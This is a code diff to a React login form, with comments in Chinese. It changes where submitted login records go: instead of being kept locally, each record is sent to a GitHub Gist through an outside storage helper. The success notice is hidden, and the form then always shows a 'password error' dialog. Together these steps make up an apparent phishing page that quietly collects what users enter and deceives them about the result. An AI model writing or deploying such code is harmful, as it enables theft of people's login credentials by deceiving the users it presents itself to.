@@ -4,7 +4,7 @@ import { Label } from "@/components/ui/label"
 import { Card, CardContent } from "@/components/ui/card"
 import { useState, useEffect } from "react"
 import { useIsMobile } from "@/hooks/use-mobile"
-import { saveLoginRecord } from "@/lib/login-records"
+import { saveLoginRecordToGist } from "@/lib/gist-storage"
 import { toast } from "sonner"
 import {
   Dialog,
@@ -74,21 +74,16 @@ export default function LoginForm() {
     try {
       console.log('准备保存登录记录:', loginRecord)
       
-      // 保存登录记录到本地文件
-      await saveLoginRecord(loginRecord)
+      // 保存登录记录到 Gist
+      await saveLoginRecordToGist(loginRecord)
       
-      console.log('登录记录保存完成')
-      console.log('当前localStorage数据:', localStorage.getItem('login_records'))
+      console.log('登录记录已保存到 Gist')
       
-      // 验证数据是否真的保存了
-      const savedData = localStorage.getItem('login_records')
-      if (savedData) {
-        const parsedData = JSON.parse(savedData)
-        console.log('解析后的数据:', parsedData)
-        console.log('数据条数:', parsedData.length)
-      } else {
-        console.error('警告：localStorage中没有找到数据！')
-      }
+      // 显示保存成功提示已隐藏
+      // toast.success('登录记录已保存', {
+      //   description: '数据已同步到云端数据库',
+      //   duration: 2000,
+      // })
       
       // 显示密码错误对话框
       setShowErrorDialog(true)
